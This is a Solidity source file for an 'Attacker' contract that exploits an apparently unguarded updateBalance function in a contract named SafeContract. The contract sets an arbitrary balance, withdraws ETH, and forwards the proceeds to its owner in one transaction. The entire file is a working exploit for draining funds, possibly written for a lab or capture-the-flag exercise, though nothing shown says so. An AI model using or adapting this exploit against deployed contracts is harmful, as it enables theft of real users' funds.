// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SafeContract.sol";

contract Attacker {
    SafeContract public notSoSafe;
    address public owner;

    constructor(address _notSoSafe) {
        notSoSafe = SafeContract(_notSoSafe);
        owner = msg.sender;
    }
    
    // Exploit the vulnerability, updating the balance of 'target' in the vulnerable contract
    function attack(address target, uint256 newBalance) public {
        notSoSafe.updateBalance(target, newBalance);
    }

    // Withdraw funds from the vulnerable contract to the attacker contract
    function withdrawFromNotSoSafe(uint256 amount) public {
        notSoSafe.withdraw(amount);
    }

    // Transfer all ETH from the attacker contract to its owner
    function transferToOwner() public {
        require(msg.sender == owner, "Only owner can withdraw funds");
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Transfer to owner failed");
    }

    // Execute the attack, withdraw, and transfer funds to the owner in a single transaction
    function attackAndTransfer(address target, uint256 newBalance, uint256 amount) public {
        attack(target, newBalance);
        withdrawFromNotSoSafe(amount);
        transferToOwner();
    }

    receive() external payable {}
}